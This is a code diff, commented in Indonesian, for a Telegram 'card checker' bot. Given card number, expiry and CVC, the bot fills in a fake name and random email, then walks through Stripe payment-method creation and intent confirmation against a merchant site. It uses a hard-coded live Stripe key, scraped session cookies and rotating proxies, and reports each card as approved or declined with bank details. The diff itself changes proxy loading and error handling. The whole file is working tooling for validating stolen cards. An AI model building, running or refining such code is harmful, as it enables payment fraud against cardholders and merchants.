@@ -22,7 +22,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # --- GLOBAL VARIABLES & DATA ---
-PROXIES = []
+PROXIES = [] # Inisialisasi di level global
 STRIPE_KEY = "pk_live_a6DCdatuNGQFYQOaddF0Guf3"
 MUSE_COOKIES = {
     "mode": "light", "_ga": "GA1.1.624514859.1750016648", "_gcl_au": "1.1.1507302922.1750016648",
@@ -38,31 +38,22 @@ BASE_HEADERS = {
     "sec-ch-ua-platform": "\"Android\"", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
 }
 
-# --- FUNGSI HELPER (Tidak berubah) ---
+# --- FUNGSI HELPER ---
+
 def load_proxies_from_file():
+    """Memuat proxy dari file proxies.txt ke variabel global."""
     global PROXIES
     try:
-        with open('proxies.txt', 'r') as f: PROXIES.extend([line.strip() for line in f if line.strip()])
-        if PROXIES: logger.info(f"Loaded {len(PROXIES)} proxies from proxies.txt.")
-    except FileNotFoundError: logger.warning("proxies.txt not found.")
-
-async def load_online_proxies():
-    api_url = "https://fkrt.in/api/http.php"
-    logger.info(f"Fetching proxies from {api_url}...")
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(api_url, timeout=15) as response:
-                if response.status == 200:
-                    proxy_text = await response.text()
-                    online_proxies = [f"http://{line.strip()}" for line in proxy_text.strip().split('\n') if line.strip()]
-                    PROXIES.extend(online_proxies)
-                    logger.info(f"Fetched {len(online_proxies)} proxies from fkrt.in.")
-                else: logger.error(f"Failed to fetch proxies from fkrt.in. Status: {response.status}")
-    except Exception as e: logger.error(f"Error fetching online proxies: {e}")
+        with open('proxies.txt', 'r') as f:
+            # Langsung isi variabel global
+            PROXIES = [line.strip() for line in f if line.strip()]
+        if PROXIES:
+            logger.info(f"Successfully loaded {len(PROXIES)} proxies from proxies.txt.")
+    except FileNotFoundError:
+        logger.warning("proxies.txt not found. Running without proxies.")
 
 async def edit_message_safe(message: Message, text: str):
-    try:
-        await message.edit_text(text)
+    try: await message.edit_text(text)
     except BadRequest as e:
         if "Message is not modified" not in str(e): logger.error(f"Error editing message: {e}")
 
@@ -78,34 +69,36 @@ async def get_bin_info(bin_number: str):
 def format_bin_info(d): return f"Brand: {d.get('scheme','?').upper()}\n⇻ Type: {d.get('type','?').upper()}\n⇻ Bank: {d.get('bank',{}).get('name','?').upper()}\n⇻ Country: {d.get('country',{}).get('name','?').upper()} {d.get('country',{}).get('emoji','')}" if d else "Brand:?\n⇻ Type:?\n⇻ Bank:?\n⇻ Country:?"
 def get_decline_message(c): return {"do_not_honor":"Penerbit kartu menolak pembayaran.","insufficient_funds":"Dana tidak mencukupi.","generic_decline":"Generic decline"}.get(c,c.replace("_"," ").capitalize()) if c else "N/A"
 
-# --- FUNGSI UTAMA DENGAN PENANDA ERROR PROXY ---
+# --- FUNGSI UTAMA ---
 async def check_card_on_muse(cc, mm, yy, cvc, message: Message, proxy_url=None):
     name = fake.name()
     email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
     timeout = ClientTimeout(total=30)
     
+    local_vars = locals()
+
     async with aiohttp.ClientSession(cookies=MUSE_COOKIES, timeout=timeout) as session:
-        # Loop melalui setiap langkah
         for step_num, step_func in enumerate([_step1_create_pm, _step2_start_payment, _step3_confirm_intent], 1):
             try:
-                result = await step_func(session, locals())
-                if "status" in result: # Jika langkah mengembalikan hasil akhir (approved/declined/error)
-                    return result
+                result = await step_func(session, local_vars)
+                if isinstance(result, dict) and "status" in result:
+                     return result
             except (aiohttp.ClientProxyConnectionError, aiohttp.ClientOSError, asyncio.TimeoutError) as e:
                 logger.error(f"[Step {step_num}] FAILED. Proxy/Connection error: {type(e).__name__}")
-                # Tambahkan flag proxy_error untuk mendeteksi proxy mati
                 return {"status": "error", "message": f"Proxy/Connection Error: {type(e).__name__}", "proxy_error": True}
             except aiohttp.ClientResponseError as e:
                 logger.error(f"[Step {step_num}] FAILED. HTTP Status {e.status}. Response: {e.message}")
-                error_data = (await e.json()).get("error", {})
-                code = error_data.get("decline_code") or error_data.get("code", "http_error")
-                return {"status": "declined", "code": code, "message": get_decline_message(code)}
+                try:
+                    error_data = (await e.json()).get("error", {})
+                    code = error_data.get("decline_code") or error_data.get("code", "http_error")
+                    return {"status": "declined", "code": code, "message": get_decline_message(code)}
+                except Exception:
+                    return {"status": "error", "message": f"HTTP Error {e.status}"}
             except aiohttp.ClientError as e:
                 logger.error(f"[Step {step_num}] FAILED. General network error: {type(e).__name__} - {e}")
                 return {"status": "error", "message": f"Network Error: {type(e).__name__}"}
-    return {"status": "error", "message": "Flow completed without a result."} # Fallback
+    return {"status": "error", "message": "Flow completed without a result."}
 
-# Fungsi-fungsi langkah (dipisah agar lebih rapi)
 async def _step1_create_pm(session, local_vars):
     await edit_message_safe(local_vars['message'], "⏳ [1/4] Creating Payment Method...")
     pm_data = {'type': 'card', 'billing_details[name]': local_vars['name'], 'billing_details[email]': local_vars['email'], 'card[number]': local_vars['cc'], 'card[cvc]': local_vars['cvc'], 'card[exp_month]': local_vars['mm'], 'card[exp_year]': local_vars['yy'], 'guid': 'bbeb7dc1-2f34-4cba-9e5a-d39fa215300a0b6163', 'payment_user_agent': 'stripe.js/22a1c02c9a', 'time_on_page': str(random.randint(50000, 60000)), 'key': STRIPE_KEY}
@@ -141,7 +134,7 @@ async def _step3_confirm_intent(session, local_vars):
         code = error.get("decline_code") or error.get("code", "unknown_decline")
         return {"status": "declined", "code": code, "message": get_decline_message(code)}
 
-# --- HANDLER TELEGRAM DENGAN LOGIKA PROXY BARU ---
+# --- HANDLER TELEGRAM ---
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     logger.error("Exception while handling an update:", exc_info=context.error)
 
@@ -169,14 +162,9 @@ async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await edit_message_safe(checking_msg, "✅ Finalizing result...")
     
-    # --- LOGIKA BARU UNTUK MENAMPILKAN STATUS PROXY ---
-    if not proxy_to_use:
-        proxy_status_str = "None"
-    elif result.get("proxy_error"): # Cek flag yang kita tambahkan
-        proxy_status_str = "Dead❌"
-    else:
-        proxy_status_str = "Live✅"
-    # --- AKHIR LOGIKA BARU ---
+    if not proxy_to_use: proxy_status_str = "None"
+    elif result.get("proxy_error"): proxy_status_str = "Dead❌"
+    else: proxy_status_str = "Live✅"
 
     full_cc_info = f"{cc}|{mm}|{yy}|{cvc}"
     bin_info_str = format_bin_info(bin_data)
@@ -189,29 +177,31 @@ async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
     final_message += f"⇻ {bin_info_str}\n"
     final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
-    final_message += f"⇻ Proxy: {proxy_status_str}\n" # Gunakan status yang baru
+    final_message += f"⇻ Proxy: {proxy_status_str}\n"
     final_message += f"(↯) Checked by: @{user.username or user.first_name}"
     
     await edit_message_safe(checking_msg, final_message)
 
-async def main():
+def main():
+    """Fungsi utama yang diubah untuk HANYA memuat proxy dari file."""
     if not TELEGRAM_BOT_TOKEN:
         logger.critical("FATAL: TELEGRAM_BOT_TOKEN environment variable not set!")
         return
     
+    # Memanggil fungsi untuk memuat dari file SAJA
     load_proxies_from_file()
-    await load_online_proxies() # Memuat proxy dari API
-    if PROXIES:
-        PROXIES = list(set(PROXIES))
-        logger.info(f"Total unique proxies available: {len(PROXIES)}")
+    
+    if not PROXIES:
+        logger.warning("No proxies loaded from proxies.txt. Bot will run without proxies.")
 
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_error_handler(error_handler)
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("au", au_command))
     
-    logger.info("Bot is starting with aiohttp and online proxies...")
+    logger.info("Bot is starting with aiohttp, using proxies from proxies.txt ONLY.")
     application.run_polling()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    # Jalankan fungsi main() yang sekarang sudah tidak asinkron lagi
+    main()
